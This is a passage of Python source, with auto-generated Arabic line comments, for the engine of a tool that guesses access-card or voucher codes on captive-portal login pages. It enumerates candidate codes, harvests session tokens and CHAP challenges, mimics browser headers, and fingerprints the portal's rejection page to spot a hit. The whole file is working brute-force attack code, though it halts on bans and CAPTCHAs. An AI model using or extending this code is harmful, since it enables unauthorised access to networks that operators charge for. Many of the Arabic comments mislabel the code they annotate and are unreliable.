# بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
"""The engine: calibrate, then try cards and report exactly what happened.

Design rules (all of them come from real failures of the old version):

1. A card is only a hit when there is positive evidence - identical-looking
   pages are never called a hit.
2. Every attempt ends in one counted verdict: ACCEPTED / REJECTED / UNKNOWN /
   BANNED / RATE_LIMITED / NET_ERROR.  The UI shows counts and reasons, so the
   user can see *why* a run went the way it did.
3. Nothing is hidden: unknown replies are saved to disk and listed for review.
4. The engine never dies silently - a traceback becomes a readable error state.
"""  # نهاية النص متعدد الأسطر

from __future__ import annotations  # استيراد annotations من الوحدة __future__

import hashlib  # استيراد الوحدة hashlib من المكتبة
import json  # استيراد الوحدة json من المكتبة
import os  # استيراد الوحدة os من المكتبة
import queue  # استيراد الوحدة queue من المكتبة
import random  # استيراد الوحدة random من المكتبة
import re  # استيراد الوحدة re من المكتبة
import threading  # استيراد الوحدة threading من المكتبة
import time  # استيراد الوحدة time من المكتبة
from collections import Counter, deque  # استيراد Counter, deque من الوحدة collections
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit  # استيراد parse_qsl, urlencode, urlsplit, urlunsplit من الوحدة urllib.parse

from . import config, portals, verify  # استيراد config, portals, verify من الوحدة .
from .errors import classify  # استيراد classify من الوحدة errors
from .fingerprint import Fingerprinter, Judge, Verdict, find_phrase  # استيراد Fingerprinter, Judge, Verdict, find_phrase من الوحدة fingerprint
from .httpclient import Session  # استيراد Session من الوحدة httpclient
from . import store  # استيراد store من الوحدة .


# ---------------------------------------------------------------------------
# بناء الطلب — ما الذي يرسله المتصفح فعلاً
# ---------------------------------------------------------------------------
def password_value(p: dict, card: str):  # تعريف الدالة password_value(p, card)
    """Return the password value, or None when the field must be omitted."""  # نص توثيقي (docstring) يشرح ما يليه
    mode = p.get("pass_mode", "empty")  # إسناد نتيجة استدعاء p.get (2 معاملات) إلى mode
    if mode == "same":  # شرط: mode يساوي 'same'
        return card  # إرجاع card
    if mode == "empty":  # شرط: mode يساوي 'empty'
        return ""  # إرجاع ''
    if mode == "omit":  # شرط: mode يساوي 'omit'
        return None  # إرجاع None
    if mode == "fixed":  # شرط: mode يساوي 'fixed'
        return p.get("pass_fixed", "")  # إرجاع p.get('pass_fixed', '')
    if mode == "md5user":  # شرط: mode يساوي 'md5user'
        return hashlib.md5(card.encode()).hexdigest()  # إرجاع hashlib.md5(card.encode()).hexdigest()
    if mode == "sha1user":  # شرط: mode يساوي 'sha1user'
        return hashlib.sha1(card.encode()).hexdigest()  # إرجاع hashlib.sha1(card.encode()).hexdigest()
    if mode == "sha256user":  # شرط: mode يساوي 'sha256user'
        return hashlib.sha256(card.encode()).hexdigest()  # إرجاع hashlib.sha256(card.encode()).hexdigest()
    if mode in ("chap", "chap_empty"):  # شرط: mode ضمن مجموعة
        raw = card if mode == "chap" else ""  # إسناد card إن مقارنة وإلا '' إلى raw
        chap = p.get("chap") or {}  # دمج منطقي (أو) وإسناده إلى chap
        blob = f"{chap.get('id', '')}{raw}{chap.get('challenge', '')}"  # بناء نص منسّق وإسناده إلى blob
        return hashlib.md5(blob.encode()).hexdigest()  # إرجاع hashlib.md5(blob.encode()).hexdigest()
    return card  # إرجاع card


def build_fields(p: dict, card: str) -> dict:  # تعريف الدالة build_fields(p, card) ترجع dict
    fields = {}  # إسناد قاموس إلى fields
    pw = password_value(p, card)  # إسناد نتيجة استدعاء password_value (2 معاملات) إلى pw
    if pw is not None:  # شرط: pw ليس نفسه None
        fields[p.get("pass_field") or "password"] = pw  # إسناد pw إلى fields[p.get('pass_field') أو ']
    fields[p.get("user_field") or "username"] = card  # إسناد card إلى fields[p.get('user_field') أو ']
    if p.get("send_dst") and p.get("dst_field"):  # شرط مركّب (و)
        fields[p["dst_field"]] = p.get("dst_value", "")  # إسناد نتيجة استدعاء p.get (2 معاملات) إلى fields[p['dst_field']]
    if p.get("send_popup") and p.get("popup_field"):  # شرط مركّب (و)
        fields[p["popup_field"]] = "true"  # إسناد القيمة الثابتة fields[p['popup_field']]
    special_fields = {p.get("user_field") or "username",  # إسناد مجموعة فريدة إلى special_fields
                      p.get("pass_field") or "password",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                      p.get("dst_field") or "dst",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                      p.get("popup_field") or "popup"}  # تكملة السطر السابق داخل القوس
    for key, value in (p.get("extra_fields") or {}).items():  # دورة على p.get('extra_fields') أو قاموس.items() باسم مجموعة
        if key in fields or key in special_fields:  # شرط مركّب (أو)
            continue  # الانتقال إلى الدورة التالية
        fields[key] = value  # إسناد value إلى fields[key]
    return fields  # إرجاع fields


def _without_query_fields(url: str, names) -> str:  # تعريف الدالة _without_query_fields(url, names) ترجع str
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Remove stale form values from a copied, already-submitted URL.

    A common way to configure a portal is to copy a URL that already contains
    `?username=OLD&password=`.  Appending the next card gives two usernames;
    many routers take the first one, so every attempt silently tests OLD.
    Preserve routing/token parameters, but replace fields we submit ourselves.
    """  # نهاية النص متعدد الأسطر
    try:  # بدايةtry محمية (يليها except/finally)
        url = portals.sanitize_login_url(url)  # إسناد نتيجة استدعاء portals.sanitize_login_url (معامل واحد) إلى url
        parts = urlsplit(url)  # إسناد نتيجة استدعاء urlsplit (معامل واحد) إلى parts
        remove = {str(n) for n in names if n}  # بناء اشتقاق مجموعة وإسناده إلى remove
        query = [(k, v) for k, v in parse_qsl(parts.query,  # بناء اشتقاق قائمة وإسناده إلى query
                                               keep_blank_values=True)  # المعامل المسمّى keep_blank_values
                 if k not in remove]  # تكملة السطر السابق داخل القوس
        return urlunsplit((parts.scheme, parts.netloc, parts.path,  # إرجاع urlunsplit(مجموعة)
                           urlencode(query, doseq=True), parts.fragment))  # تكملة السطر السابق داخل القوس
    # تكملة السطر السابق داخل القوس
    except Exception:                                   # noqa: BLE001
        return url  # إرجاع url


def _get_request_url(p: dict, fields: dict) -> str:  # تعريف الدالة _get_request_url(p, fields) ترجع str
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Build GET query pairs in the order the copied/form URL established.

    Requests' `params=` appends fields in dictionary order (which used to put
    password before username and added defaults before respecting the browser's
    URL shape). Merge values into existing query slots, then append only truly
    new fields.
    """  # نهاية النص متعدد الأسطر
    url = portals.sanitize_login_url(  # إسناد نتيجة استدعاء portals.sanitize_login_url (3 معاملات) إلى url
        p.get("login_url", ""), p.get("user_field", "username"),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
        p.get("pass_field", "password"))  # تكملة السطر السابق داخل القوس
    parts = urlsplit(url)  # إسناد نتيجة استدعاء urlsplit (معامل واحد) إلى parts
    source = parse_qsl(parts.query, keep_blank_values=True)  # إسناد نتيجة استدعاء parse_qsl (معامل واحد، keep_blank_values=…) إلى source
    submitted = {str(k): str(v) for k, v in fields.items()}  # بناء قاموس بالاشتقاق وإسناده إلى submitted
    pairs, placed = [], set()  # إسناد مجموعة إلى مجموعة
    for key, value in source:  # دورة على source باسم مجموعة
        if key in submitted:  # شرط: key ضمن submitted
            pairs.append((key, submitted[key]))  # استدعاء pairs.append (معامل واحد)
            placed.add(key)  # استدعاء placed.add (معامل واحد)
        else:  # مفتاح else في القاموس
            pairs.append((key, value))  # استدعاء pairs.append (معامل واحد)
    for key, value in fields.items():  # دورة على fields.items() باسم مجموعة
        if str(key) not in placed:  # شرط: str(key) ليس ضمن placed
            pairs.append((str(key), str(value)))  # استدعاء pairs.append (معامل واحد)
    return urlunsplit((parts.scheme, parts.netloc, parts.path,  # إرجاع urlunsplit(مجموعة)
                       urlencode(pairs, doseq=True), parts.fragment))  # تكملة السطر السابق داخل القوس


def _request_components(p: dict, card: str):  # تعريف الدالة _request_components(p, card)
    fields = build_fields(p, card)  # إسناد نتيجة استدعاء build_fields (2 معاملات) إلى fields
    method = (p.get("method") or "post").lower()  # إسناد نتيجة استدعاء p.get('method') أو 'post'.lower إلى method
    if method == "post":  # شرط: method يساوي 'post'
        url = _without_query_fields(  # إسناد نتيجة استدعاء _without_query_fields (2 معاملات) إلى url
            p["login_url"], (p.get("user_field") or "username",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                             p.get("pass_field") or "password"))  # تكملة السطر السابق داخل القوس
    else:  # مفتاح else في القاموس
        url = _get_request_url(p, fields)  # إسناد نتيجة استدعاء _get_request_url (2 معاملات) إلى url
    return method, url, fields  # إرجاع مجموعة


def _safe_url_shape(url: str, p: dict) -> str:  # تعريف الدالة _safe_url_shape(url, p) ترجع str
    parts = urlsplit(url or "")  # إسناد نتيجة استدعاء urlsplit (معامل واحد) إلى parts
    safe_pairs = []  # إسناد قائمة إلى safe_pairs
    user_name = (p.get("user_field") or "username").lower()  # إسناد نتيجة استدعاء p.get('user_field') أو 'username'.lower إلى user_name
    pass_name = (p.get("pass_field") or "password").lower()  # إسناد نتيجة استدعاء p.get('pass_field') أو 'password'.lower إلى pass_name
    for key, value in parse_qsl(parts.query, keep_blank_values=True):  # دورة على parse_qsl(parts.query, keep_blank_values=True) باسم مجموعة
        low = key.lower()  # إسناد نتيجة استدعاء key.lower إلى low
        if low == user_name:  # شرط: low يساوي user_name
            shown = "[CARD]"  # إسناد القيمة الثابتة shown
        elif low == pass_name:  # شرط: low يساوي pass_name
            shown = "[EMPTY]" if not value else "[REDACTED]"  # إسناد '[EMPTY]' إن نفي/سالب وإلا '[REDACTED]' إلى shown
        else:  # مفتاح else في القاموس
            shown = "[REDACTED]" if value else "[EMPTY]"  # إسناد '[REDACTED]' إن value وإلا '[EMPTY]' إلى shown
        safe_pairs.append((key, shown))  # استدعاء safe_pairs.append (معامل واحد)
    # احذف userinfo من العنوان إضافة إلى قيم الاستعلام؛ فهو غير مطلوب
    # لشرح شكل الطلب، وقد يحتوي بيانات دخول.
    netloc = parts.netloc.rsplit("@", 1)[-1]  # إسناد parts.netloc.rsplit('@', 1)[نفي/سالب] إلى netloc
    return urlunsplit((parts.scheme, netloc, parts.path,  # إرجاع urlunsplit(مجموعة)
                       urlencode(safe_pairs, doseq=True), ""))  # تكملة السطر السابق داخل القوس


# شكل الطلب كما يُعرض: [CARD] و[EMPTY] و[REDACTED] بدل القيم، وحذف userinfo@.
def safe_request_shape(p: dict, card: str) -> dict:  # تعريف الدالة safe_request_shape(p, card) ترجع dict
    """Describe the actual request without preserving card/token values."""  # نص توثيقي (docstring) يشرح ما يليه
    method, url, fields = _request_components(p, card)  # إسناد نتيجة استدعاء _request_components (2 معاملات) إلى مجموعة
    return {"method": method.upper(), "url": _safe_url_shape(url, p),  # إرجاع قاموس
            "field_names": list(fields),  # مفتاح field_names في القاموس
            "body_field_names": list(fields) if method == "post" else []}  # مفتاح body_field_names في القاموس


def send_login(session: Session, p: dict, card: str, timeout=None):  # تعريف الدالة send_login(session, p, card, timeout)
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """One login attempt. Redirects are NOT followed: we must see the
    Location header, because that is the proof the portal let us out."""  # نهاية النص متعدد الأسطر
    method, url, fields = _request_components(p, card)  # إسناد نتيجة استدعاء _request_components (2 معاملات) إلى مجموعة
    if method == "post":  # شرط: method يساوي 'post'
        return session.request("POST", url, data=fields,  # إرجاع session.request('POST', url, data=fields, allow_redirects=False, timeout=timeout)
                               allow_redirects=False, timeout=timeout)  # المعامل المسمّى allow_redirects
    return session.request("GET", url, allow_redirects=False, timeout=timeout)  # إرجاع session.request('GET', url, allow_redirects=False, timeout=timeout)


def submitted_values(p: dict, card: str) -> list:  # تعريف الدالة submitted_values(p, card) ترجع list
    values = [card, password_value(p, card) or ""]  # إسناد قائمة إلى values
    if p.get("send_dst"):  # شرط: نتيجة p.get('send_dst')
        values.append(p.get("dst_value", ""))  # استدعاء values.append (معامل واحد)
    return [v for v in values if v]  # إرجاع اشتقاق قائمة


# ترويسات كما يرسلها المتصفح: Origin على POST فقط، وReferer منقّى.
def browser_headers(p: dict, url: str = "") -> dict:  # تعريف الدالة browser_headers(p, url) ترجع dict
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """The headers a browser would send with this request.

    Some portals refuse anything that does not look like a browser: no
    Referer, no Origin, no form content type, or a User-Agent they do not
    like - and the operator then only ever sees "bad request".
    """  # نهاية النص متعدد الأسطر
    h = dict(config.BASE_HEADERS)  # إسناد نتيجة استدعاء dict (معامل واحد) إلى h
    ua = (p.get("user_agent") or "").strip()  # إسناد نتيجة استدعاء p.get('user_agent') أو ''.strip إلى ua
    if ua:  # شرط: ua
        h["User-Agent"] = ua  # إسناد ua إلى h['User-Agent']
    method = (p.get("method") or "post").lower()  # إسناد نتيجة استدعاء p.get('method') أو 'post'.lower إلى method
    if url and p.get("send_referer", True):  # شرط مركّب (و)
        # لا تصدّي بطاقة حقيقية من رابط منسوخ مُرسَل سابقاً إلى
        # Referer. الطلب نفسه يستبدل تلك القيم أدناه أيضاً.
        ref_url = _without_query_fields(  # إسناد نتيجة استدعاء _without_query_fields (2 معاملات) إلى ref_url
            url, (p.get("user_field") or "username",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                  p.get("pass_field") or "password"))  # تكملة السطر السابق داخل القوس
        h["Referer"] = ref_url  # إسناد ref_url إلى h['Referer']
        # المتصفح يرسل Origin مع POST لنموذج، لا مع تنقّل GET
        # عادي. إرساله مع GET جعل رابط المتصفح المنسوخ يبدو أقل
        # شبهاً بالمتصفح الذي نجح لتوّه مع المستخدم.
        if method == "post":  # شرط: method يساوي 'post'
            try:  # بدايةtry محمية (يليها except/finally)
                parts = urlsplit(url)  # إسناد نتيجة استدعاء urlsplit (معامل واحد) إلى parts
            # تكملة السطر السابق داخل القوس
            except Exception:                           # noqa: BLE001
                parts = None  # إسناد القيمة الثابتة parts
            if parts and parts.scheme and parts.netloc:  # شرط مركّب (و)
                h["Origin"] = f"{parts.scheme}://{parts.netloc}"  # بناء نص منسّق وإسناده إلى h['Origin']
    if method == "post":  # شرط: method يساوي 'post'
        h["Content-Type"] = "application/x-www-form-urlencoded"  # إسناد القيمة الثابتة h['Content-Type']
    return h  # إرجاع h


def new_session(timeout=None, for_attack: bool = False, headers=None) -> Session:  # تعريف الدالة new_session(timeout, for_attack, headers) ترجع Session
    """A fresh session. `for_attack` uses the tighter login timeout."""  # نص توثيقي (docstring) يشرح ما يليه
    if timeout is None:  # شرط: timeout هو نفسه None
        timeout = (config.CONNECT_TIMEOUT,  # إسناد مجموعة إلى timeout
                   config.ATTACK_READ_TIMEOUT if for_attack else config.READ_TIMEOUT)  # تكملة السطر السابق داخل القوس
    return Session(connect_timeout=timeout[0], read_timeout=timeout[1],  # إرجاع Session(connect_timeout=timeout[0], read_timeout=timeout[1], headers=headers)
                   headers=headers)  # المعامل المسمّى headers


# يأخذ أسماء الحقول والرابط والقيم المخفية من صفحة طازجة.
# if not form.inputs: return p مقصود: صفحة حجب لا تستبدل أسماء الحقول بالافتراضية.
def absorb_form(p: dict, html: str, url: str) -> dict:  # تعريف الدالة absorb_form(p, html, url) ترجع dict
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Take what a freshly fetched login page is offering: field names, the
    form action, and the hidden values (session token, dst, popup ...).

    Without this the tool keeps posting the values captured during the scan -
    by another session, minutes ago - and portals that hand out a per-session
    token answer "bad request" for every single card.
    """  # نهاية النص متعدد الأسطر
    if not (html or "").strip():  # شرط معكوس: ليس html أو ''.strip()
        return p  # إرجاع p
    form = portals.parse_form(html, url)  # إسناد نتيجة استدعاء portals.parse_form (2 معاملات) إلى form
    if not form.inputs:  # شرط معكوس: ليس form.inputs
        # صفحة بلا نموذج — صفحة حجب أو خطأ أو بوابة أدخلتنا
        # فعلاً — يجب ألا تستبدل أبداً أسماء حقول نعرفها:
        # parse_form() يسقط على username/password عندما لا يجد
        # شيئاً، وهذا كان يكسر بروفايلاً عاملاً بصمت.
        return p  # إرجاع p
    out = dict(p)  # إسناد نتيجة استدعاء dict (معامل واحد) إلى out
    if form.action:  # شرط: form.action
        out["login_url"] = form.action  # إسناد form.action إلى out['login_url']
    if form.method in ("get", "post"):  # شرط: form.method ضمن مجموعة
        out["method"] = form.method  # إسناد form.method إلى out['method']
    if form.user_field:  # شرط: form.user_field
        out["user_field"] = form.user_field  # إسناد form.user_field إلى out['user_field']
    if form.pass_field:  # شرط: form.pass_field
        out["pass_field"] = form.pass_field  # إسناد form.pass_field إلى out['pass_field']
    if form.dst_field:  # شرط: form.dst_field
        # النموذج المجلوب طازجاً هو المرجع: store.migrate يعطي قيمة
        # dst قديمة افتراضية يجب ألا تطمس اسماً مخصصاً مكتشفاً.
        out["dst_field"] = form.dst_field  # إسناد form.dst_field إلى out['dst_field']
    if form.dst_value and not p.get("dst_value"):  # شرط مركّب (و)
        out["dst_value"] = form.dst_value  # إسناد form.dst_value إلى out['dst_value']
    if form.popup_field:  # شرط: form.popup_field
        out["popup_field"] = form.popup_field  # إسناد form.popup_field إلى out['popup_field']
    if form.chap:  # شرط: form.chap
        out["chap"] = form.chap  # إسناد form.chap إلى out['chap']
    extra = dict(p.get("extra_fields") or {})  # إسناد نتيجة استدعاء dict (معامل واحد) إلى extra
    fresh = 0  # إسناد القيمة الثابتة fresh
    for name, value in (form.fields or {}).items():  # دورة على form.fields أو قاموس.items() باسم مجموعة
        if name in (out.get("user_field"), out.get("pass_field"),  # شرط: name ضمن مجموعة
                    out.get("dst_field"), out.get("popup_field")):  # تكملة تعريف متعدد الأسطر
            continue  # الانتقال إلى الدورة التالية
        # الوجود نفسه مهم: بوابات عدة تشترط وجود حقل مخفي فارغ
        # داخل النموذج المُرسَل. حذفه يغيّر شكل الطلب حتى لو
        # كانت قيمته فارغة.
        extra[name] = value  # إسناد value إلى extra[name]
        fresh += 1  # تحديث fresh بعملية جمع
    if fresh:  # شرط: fresh
        out["extra_fields"] = extra  # إسناد extra إلى out['extra_fields']
    return out  # إرجاع out


# طلب صفحة الدخول لأخذ الكوكي والحقول المخفية. بلا صفحة ⇒ None ⇒ no_session
# والبطاقة لا تُرسل أصلاً (الإرسال بلا جلسة يقيس رفض الشكل لا رفض البطاقة).
def warm_up(session, p: dict, tries: int = 2) -> dict:  # تعريف الدالة warm_up(session, p, tries) ترجع dict
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Ask for the login page first, the way a browser does.

    A portal hands out a session cookie and hidden fields (dst, popup, a
    per-session token, sometimes a chap challenge) *on the page*.  Posting
    without them gets "bad request" instead of a judgement - which is why a
    card that works in a browser never works from a script.  Returns the
    profile refreshed with what the page just gave us, or **None** when the
    portal did not give us a page at all: a post then would only be refused,
    and the card must stay untested instead of paying for a wish.
    """  # نهاية النص متعدد الأسطر
    for attempt in range(max(1, int(tries))):  # دورة على range(max(1, int(tries))) باسم attempt
        try:  # بدايةtry محمية (يليها except/finally)
            resp = session.get(p["login_url"], allow_redirects=True)  # إسناد نتيجة استدعاء session.get (معامل واحد، allow_redirects=…) إلى resp
        # تكملة السطر السابق داخل القوس
        except Exception:                               # noqa: BLE001
            resp = None  # إسناد القيمة الثابتة resp
        if resp is not None and (resp.text or "").strip():  # شرط مركّب (و)
            return absorb_form(p, resp.text, resp.url or p["login_url"])  # إرجاع absorb_form(p, resp.text, resp.url أو p['login_url'])
        if attempt + 1 < max(1, int(tries)):  # شرط: جمع أصغر من max(1, int(tries))
            time.sleep(0.15)  # استدعاء time.sleep (معامل واحد)
    return None  # إرجاع None


def _ban_evidence(resp, login_url: str, word: str = "", stop: bool = False,  # تعريف الدالة _ban_evidence(resp, login_url, word, stop, reason) ترجع dict
                  reason: str = "") -> dict:  # مفتاح reason في القاموس
    """Structured stop evidence for the operator — never a bypass hint."""  # نص توثيقي (docstring) يشرح ما يليه
    body = resp.text or ""  # دمج منطقي (أو) وإسناده إلى body
    has_form = bool(portals.parse_form(body, login_url).inputs)  # إسناد نتيجة استدعاء bool (معامل واحد) إلى has_form
    status = getattr(resp, "status", 0) or 0  # دمج منطقي (أو) وإسناده إلى status
    return {  # إرجاع قاموس
        "status": status,  # مفتاح status في القاموس
        "word": word or reason or "",  # مفتاح word في القاموس
        "has_form": has_form,  # مفتاح has_form في القاموس
        "stop": bool(stop),  # مفتاح stop في القاموس
        "reason": reason or word or (f"HTTP {status}" if status else ""),  # مفتاح reason في القاموس
        # تصنيف مبدئي لتشخيص المسؤول فقط — لا يُستخدم للاستئناف.
        "kind_hint": (  # مفتاح kind_hint في القاموس
            "captcha" if reason == "captcha_challenge" else  # تكملة السطر السابق داخل القوس
            "rate_limit" if status == 429 or (word and ("rate" in word  # تكملة السطر السابق داخل القوس
                                                        or "slow down" in word  # تكملة السطر السابق داخل القوس
                                                        or "محاولات" in word)) else  # تكملة السطر السابق داخل القوس
            "http_block" if status in (403, 503) else  # تكملة السطر السابق داخل القوس
            "page_block" if word else  # تكملة السطر السابق داخل القوس
            "unknown"  # تكملة السطر السابق داخل القوس
        ),  # إغلاق القوس المفتوح في السطر السابق
    }  # إغلاق القوس المفتوح في السطر السابق


def _is_protective_reply(resp, login_url: str) -> tuple:  # تعريف الدالة _is_protective_reply(resp, login_url) ترجع tuple
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Return (stop, evidence_str, evidence_dict) for blocks / limits / CAPTCHA.

    The string form keeps older call sites working; the dict is the structured
    ban_evidence written into stop reports for the network admin.
    """  # نهاية النص متعدد الأسطر
    body = resp.text or ""  # دمج منطقي (أو) وإسناده إلى body
    raw = body.lower()  # إسناد نتيجة استدعاء body.lower إلى raw
    if resp.status in (403, 429):  # شرط: resp.status ضمن مجموعة
        reason = f"HTTP {resp.status}"  # بناء نص منسّق وإسناده إلى reason
        evidence = _ban_evidence(resp, login_url, reason=reason, stop=True)  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، reason=…، stop=…) إلى evidence
        return True, reason, evidence  # إرجاع مجموعة
    if any(word in raw for word in ("captcha", "g-recaptcha", "hcaptcha",  # شرط: نتيجة any(مولّد)
                                    "recaptcha", "cf-turnstile")):  # تكملة تعريف متعدد الأسطر
        evidence = _ban_evidence(resp, login_url, reason="captcha_challenge",  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، reason=…، stop=…) إلى evidence
                                 stop=True)  # المعامل المسمّى stop
        return True, "captcha_challenge", evidence  # إرجاع مجموعة
    word = find_phrase(raw, config.BAN_WORDS)  # إسناد نتيجة استدعاء find_phrase (2 معاملات) إلى word
    has_form = bool(portals.parse_form(body, login_url).inputs)  # إسناد نتيجة استدعاء bool (معامل واحد) إلى has_form
    if word and not has_form:  # شرط مركّب (و)
        evidence = _ban_evidence(resp, login_url, word=word, stop=True)  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، word=…، stop=…) إلى evidence
        return True, word, evidence  # إرجاع مجموعة
    evidence = _ban_evidence(resp, login_url, word=word, stop=False)  # إسناد نتيجة استدعاء _ban_evidence (2 معاملات، word=…، stop=…) إلى evidence
    return False, word, evidence  # إرجاع مجموعة


# ---------------------------------------------------------------------------
# المعايرة
# ---------------------------------------------------------------------------
class Calibration:  # تعريف الصنف Calibration
    def __init__(self):  # تعريف الدالة __init__(self)
        self.steps = []  # إسناد قائمة إلى self.steps
        self.ok = False  # إسناد القيمة الثابتة self.ok
        self.fingerprint = None  # إسناد القيمة الثابتة self.fingerprint
        self.judge = None  # إسناد القيمة الثابتة self.judge
        self.profile = {}  # إسناد قاموس إلى self.profile
        self.internet = {}  # إسناد قاموس إلى self.internet
        self.portal = None  # إسناد القيمة الثابتة self.portal
        self.success_words = []  # إسناد قائمة إلى self.success_words
        self.tuned = None        # أي pass_mode/dst جعل البطاقة المعروفة تعمل
        self.error = ""  # إسناد القيمة الثابتة self.error

    def step(self, sid: str, ok: bool, reason: str, detail=None) -> None:  # تعريف الدالة step(self, sid, ok, reason, detail) ترجع None
        self.steps.append({"id": sid, "ok": bool(ok), "reason": reason,  # استدعاء self.steps.append (معامل واحد)
                           "detail": detail or {}})  # مفتاح detail في القاموس

    def as_dict(self) -> dict:  # تعريف الدالة as_dict(self) ترجع dict
        applied = None  # إسناد القيمة الثابتة applied
        if self.tuned and self.tuned.get("verified"):  # شرط مركّب (و)
            applied = {key: self.profile.get(key) for key in (  # بناء قاموس بالاشتقاق وإسناده إلى applied
                "login_url", "method", "user_field", "pass_field",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                "pass_mode", "dst_field", "dst_value", "popup_field",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                "send_dst", "send_popup")}  # تكملة قيمة المفتاح/العنصر السابق
            applied["extra_field_names"] = sorted(  # إسناد نتيجة استدعاء sorted (معامل واحد) إلى applied['extra_field_names']
                (self.profile.get("extra_fields") or {}).keys())  # تكملة السطر السابق داخل القوس
            applied["field_names"] = list(build_fields(self.profile, "CARD"))  # إسناد نتيجة استدعاء list (معامل واحد) إلى applied['field_names']
        return {"ok": self.ok, "steps": self.steps,  # إرجاع قاموس
                "internet": self.internet, "error": self.error,  # مفتاح internet في القاموس
                "tuned": self.tuned, "applied_settings": applied,  # مفتاح tuned في القاموس
                "success_words": self.success_words,  # مفتاح success_words في القاموس
                "fingerprint": None if not self.fingerprint else {  # مفتاح fingerprint في القاموس
                    "exact": self.fingerprint.exact,  # مفتاح exact في القاموس
                    "note": self.fingerprint.note,  # مفتاح note في القاموس
                    "dynamic_tokens": self.fingerprint.dynamic_count,  # مفتاح dynamic_tokens في القاموس
                    "masked_values": len(self.fingerprint.literals),  # مفتاح masked_values في القاموس
                    "learned_patterns": len(self.fingerprint.patterns),  # مفتاح learned_patterns في القاموس
                    "reject_status": self.fingerprint.reject_status,  # مفتاح reject_status في القاموس
                    "reject_length": self.fingerprint.reject_len,  # مفتاح reject_length في القاموس
                    "samples": self.fingerprint.samples,  # مفتاح samples في القاموس
                },  # إغلاق القوس المفتوح في السطر السابق
                "portal": self.portal.as_dict() if self.portal else None}  # مفتاح portal في القاموس


# بطاقات تجريبية من داخل الفضاء الحقيقي حتى يردّ الراوتر بصفحة «بطاقة خاطئة»
# لا بصفحة «صيغة خاطئة».
def bench_cards(p: dict, count: int = 3, seed: int = 0, exclude=()) -> list:  # تعريف الدالة bench_cards(p, count, seed, exclude) ترجع list
    # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
    """Format-valid cards used to learn the rejection page.

    They are drawn from inside the real space, so the router answers with its
    true "wrong card" page - not with a "bad format" page, which was one of
    the reasons the old baseline was wrong.
    """  # نهاية النص متعدد الأسطر
    space = store.space_size(p)  # إسناد نتيجة استدعاء store.space_size (معامل واحد) إلى space
    if space <= 0:  # شرط: space أصغر أو يساوي 0
        return []  # إرجاع قائمة
    excluded = set(exclude or ())  # إسناد نتيجة استدعاء set (معامل واحد) إلى excluded
    wanted = min(max(0, int(count)), max(0, space - len(excluded)))  # إسناد نتيجة استدعاء min (2 معاملات) إلى wanted
    if not wanted:  # شرط معكوس: ليس wanted
        return []  # إرجاع قائمة
    rnd = random.Random(seed or int(time.time()))  # إسناد نتيجة استدعاء random.Random (معامل واحد) إلى rnd
    picks = set()  # إسناد نتيجة استدعاء set إلى picks
    attempts = 0  # إسناد القيمة الثابتة attempts
    while len(picks) < wanted and attempts < max(space * 2, wanted * 20):  # حلقة ما دام مقارنة و مقارنة
        idx = rnd.randrange(space)  # إسناد نتيجة استدعاء rnd.randrange (معامل واحد) إلى idx
        attempts += 1  # تحديث attempts بعملية جمع
        card = store.decode_card(p, idx)  # إسناد نتيجة استدعاء store.decode_card (2 معاملات) إلى card
        if card not in excluded:  # شرط: card ليس ضمن excluded
            picks.add(idx)  # استدعاء picks.add (معامل واحد)
    if len(picks) < wanted and space <= 100000:  # شرط مركّب (و)
        for idx in range(space):  # دورة على range(space) باسم idx
            if store.decode_card(p, idx) not in excluded:  # شرط: store.decode_card(p, idx) ليس ضمن excluded
                picks.add(idx)  # استدعاء picks.add (معامل واحد)
                if len(picks) >= wanted:  # شرط: len(picks) أكبر أو يساوي wanted
                    break  # قطع الحلقة فوراً
    return [store.decode_card(p, i) for i in sorted(picks)]  # إرجاع اشتقاق قائمة


# مرحلة التعلّم قبل التخمين، بخطوات مفهرسة يستطيع المستخدم قراءتها.
# أي خطوة تفشل ⇒ cal.error ولا يبدأ التخمين.
def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعريف الدالة calibrate(profile, known_card, keyword, learn_known, log, checks, probes, preflight_only) ترجع Calibration
              learn_known: bool = True, log=None, checks=None,  # مفتاح learn_known في القاموس
              probes: int = 3, preflight_only: bool = False) -> Calibration:  # مفتاح probes في القاموس
    p = store.migrate(profile)  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى p
    cal = Calibration()  # إسناد نتيجة استدعاء Calibration إلى cal
    cal.profile = p  # إسناد p إلى cal.profile
    say = log or (lambda *a, **k: None)  # دمج منطقي (أو) وإسناده إلى say

    # بروفايل لا ينتج بطاقة واحدة (بادئة أطول من البطاقة،
    # أبجدية من رمز واحد …) كان «يعاير بنجاح» بخط أساس
    # فارغ، ثم يُقاس كل ردّ على لا شيء.
    problems = [x for x in store.validate(p)  # بناء اشتقاق قائمة وإسناده إلى problems
                if x != "space_is_astronomically_big"]  # تكملة السطر السابق داخل القوس
    if problems:  # شرط: problems
        cal.error = problems[0]  # إسناد problems[0] إلى cal.error
        cal.step("profile_valid", False, problems[0], {"problems": problems})  # استدعاء cal.step (4 معاملات)
